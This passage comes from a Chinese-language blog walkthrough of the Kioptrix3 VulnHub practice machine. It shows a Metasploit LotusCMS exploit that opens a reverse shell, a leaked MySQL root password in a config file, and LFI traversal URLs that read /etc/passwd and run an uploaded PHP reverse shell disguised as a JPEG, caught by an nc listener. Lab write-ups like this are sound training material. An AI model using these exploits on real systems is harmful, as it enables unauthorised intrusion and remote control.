from Google Images, so being part of the</span></span><br><span class="line"><span class="string">public domain I used them.</span></span><br></pre></td></tr></table></figure>
+
+<p>至此挑战完成。</p>
+<h3 id="更多方法"><a href="#更多方法" class="headerlink" title="更多方法"></a>更多方法</h3><ul>
+<li>利用LotusCMS 3.0 eval（）远程命令执行漏洞</li>
+</ul>
+<p>使用msf中的exploit&#x2F;multi&#x2F;http&#x2F;lcms_php_exec模块可以直接getshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"><span class="comment"># cowsay++</span></span><br><span class="line"> ____________</span><br><span class="line">&lt; metasploit &gt;</span><br><span class="line"> ------------</span><br><span class="line">       \   ,__,</span><br><span class="line">        \  (oo)____</span><br><span class="line">           (__)    )\</span><br><span class="line">              ||--|| *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.63-dev                          ]</span><br><span class="line">+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/http/lcms_php_exec</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> RHOSTS 192.168.84.144</span><br><span class="line">RHOSTS =&gt; 192.168.84.144</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> payload generic/shell_reverse_tcp                                                                                                                                                             </span><br><span class="line">payload =&gt; generic/shell_reverse_tcp                                                                                                                                                                                                       </span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> LHOST 192.168.84.135</span><br><span class="line">LHOST =&gt; 192.168.84.135                                                                                                                                                                                                                    </span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> URI /                                                                                                                                                                                         </span><br><span class="line">URI =&gt; /</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.84.135:4444 </span><br><span class="line">[*] Using found page param: /index.php?page=index</span><br><span class="line">[*] Sending exploit ...</span><br><span class="line">[*] Command shell session 2 opened (192.168.84.135:4444 -&gt; 192.168.84.144:57666) at 2019-12-14 06:18:03 -0500</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+
+<p>成功getshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la gallery/</span><br><span class="line">total 164</span><br><span class="line">drwxr-xr-x 7 root root  4096 Apr 14  2011 .</span><br><span class="line">drwxr-xr-x 8 root root  4096 Apr 15  2011 ..</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK</span><br><span class="line">-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql</span><br><span class="line">-rw-r--r-- 1 root root   252 Apr 12  2011 g.php</span><br><span class="line">drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php</span><br><span class="line">-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php</span><br><span class="line">-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php</span><br><span class="line">-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php</span><br><span class="line">-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 index.php</span><br><span class="line">-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK</span><br><span class="line">-rw-r--r-- 1 root root   212 Apr 12  2011 login.php</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 p.php</span><br><span class="line">drwxrwxrwx 2 root root  4096 Apr 12  2011 photos</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php</span><br><span class="line">-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php</span><br><span class="line">-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php</span><br><span class="line">-rw-r--r-- 1 root root   215 Apr 12  2011 register.php</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 search.php</span><br><span class="line">-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php</span><br><span class="line">drwxr-xr-x 6 root root  4096 Apr 12  2011 themes</span><br><span class="line">-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php</span><br></pre></td></tr></table></figure>
+
+<p>在gallery目录下发现phpmyadmin配置文件中的phpmyadmin的用户名和密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> gallery/gconfig.php</span><br><span class="line">&lt;?php</span><br><span class="line">        error_reporting(0);</span><br><span class="line">        /*</span><br><span class="line">                A sample Gallarific configuration file. You should edit</span><br><span class="line">                the installer details below and save this file as gconfig.php</span><br><span class="line">                Do not modify anything <span class="keyword">else</span> <span class="keyword">if</span> you don<span class="string">&#x27;t know what it is.</span></span><br><span class="line"><span class="string">        */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Installer Details -----------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Enter the full HTTP path to your Gallarific folder below,</span></span><br><span class="line"><span class="string">        // such as http://www.yoursite.com/gallery</span></span><br><span class="line"><span class="string">        // Do NOT include a trailing forward slash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_path&quot;] = &quot;http://kioptrix3.com/gallery&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Setting Details -------------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(!$g_mysql_c = @mysql_connect($GLOBALS[&quot;gallarific_mysql_server&quot;], $GLOBALS[&quot;gallarific_mysql_username&quot;], $GLOBALS[&quot;gallarific_mysql_password&quot;])) &#123;</span></span><br><span class="line"><span class="string">                echo(&quot;A connection to the database couldn&#x27;</span>t be established: <span class="string">&quot; . mysql_error());</span></span><br><span class="line"><span class="string">                die();</span></span><br><span class="line"><span class="string">&#125;else &#123;</span></span><br><span class="line"><span class="string">        if(!<span class="variable">$g_mysql_d</span> = @mysql_select_db(<span class="variable">$GLOBALS</span>[&quot;</span>gallarific_mysql_database<span class="string">&quot;], <span class="variable">$g_mysql_c</span>)) &#123;</span></span><br><span class="line"><span class="string">                echo(&quot;</span>The Gallarific database couldn<span class="string">&#x27;t be opened: &quot; . mysql_error());</span></span><br><span class="line"><span class="string">                die();</span></span><br><span class="line"><span class="string">        &#125;else &#123;</span></span><br><span class="line"><span class="string">                $settings=mysql_query(&quot;select * from gallarific_settings&quot;);</span></span><br><span class="line"><span class="string">                if(mysql_num_rows($settings)!=0)&#123;</span></span><br><span class="line"><span class="string">                        while($data=mysql_fetch_array($settings))&#123;</span></span><br><span class="line"><span class="string">                                $GLOBALS[&quot;&#123;$data[&#x27;</span>settings_name<span class="string">&#x27;]&#125;&quot;]=$data[&#x27;</span>settings_value<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现phpmyadmin的用户名密码：root&#x2F;fuckeyou，直接登录然后getshell</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub52.jpg"></p>
+<p>具体参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kZGQ0MWI4NDFjMzY=">phpmyadmin getshell<i class="fa fa-external-link-alt"></i></span></p>
+<ul>
+<li>LFI漏洞组合利用</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.84.144/index.php?system=../../../../../../../etc/passwd%00.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub53.jpg"></p>
+<p>使用之前的sql注入得到admin的密码下图所示登录</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub54.jpg"></p>
+<p>将php reverse shell木马后缀改成.jpg上传，然后右键得到图片的链接</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub55.jpg"></p>
+<p>浏览器访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.84.144/index.php?system=../../../../../../../home/www/kioptrix3.com/gallery/photos/x281lo68jw.jpg%00.html</span><br></pre></td></tr></table></figure>
+
+<p>同时kali端nc监听成功返回shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">connect to [192.168.84.135] from kioptrix3.com [192.168.84.144] 37790</span><br><span class="line">Linux Kioptrix3 2.6.24-24-server <span class="comment">#1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux</span></span><br><span class="line"> 15:10:15 up  2:59,  1 user,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">loneferr pts/0    192.168.84.135   12:27   21:13m  4.66s  0.01s sshd: loneferre</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>
+<p>6的一批！！！！！！</p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="red"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2019/12/13/KVM3/" title="vulnhub靶机渗透[KVM3]">https://fdlucifer.github.io/2019/12/13/KVM3/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/12/12/Hackademic-RTB2/" rel="prev" title="vulnhub靶机渗透[Hackademic-RTB2]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[Hackademic-RTB2]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/12/14/pWnOS2-0-Pre-Release/" rel="next" title="vulnhub靶机渗透[pWnOS2.0-Pre-Release]">
+                  vulnhub靶机渗透[pWnOS2.0-Pre-Release] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
